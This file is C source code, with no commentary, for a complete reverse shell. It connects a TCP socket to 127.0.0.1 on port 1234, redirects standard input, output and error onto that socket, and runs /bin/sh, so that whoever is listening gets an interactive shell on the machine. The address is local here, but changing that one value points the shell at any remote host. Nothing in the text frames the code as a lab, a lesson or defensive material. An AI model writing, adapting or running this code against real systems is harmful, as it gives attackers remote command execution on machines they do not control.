#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define SOCKET_ERROR -1

int main(void) {
    struct sockaddr_in shell_info;
    shell_info.sin_family = AF_INET;
    shell_info.sin_port = htons(1234);
    shell_info.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    int shell = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (shell == SOCKET_ERROR) {
    	printf("[!] Failed to create socket.\n");
    	return 0;
    }
    
    if (connect(shell, (struct sockaddr*)&shell_info, sizeof(shell_info)) == SOCKET_ERROR) {
    	printf("[!] Failed to connect.\n");
    	return 0;
    }
    
    char send_msg[] = "[!] Press ENTER to continue...\n";
    send(shell, send_msg, strlen(send_msg), NULL);
    
    char recv_buffer[1048];
    recv(shell, recv_buffer, sizeof(recv_buffer), 0);
    
    dup2(shell, 0);
    dup2(shell, 1);
    dup2(shell, 2);

    char* args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    
    close(shell);
    
    return 0;
}
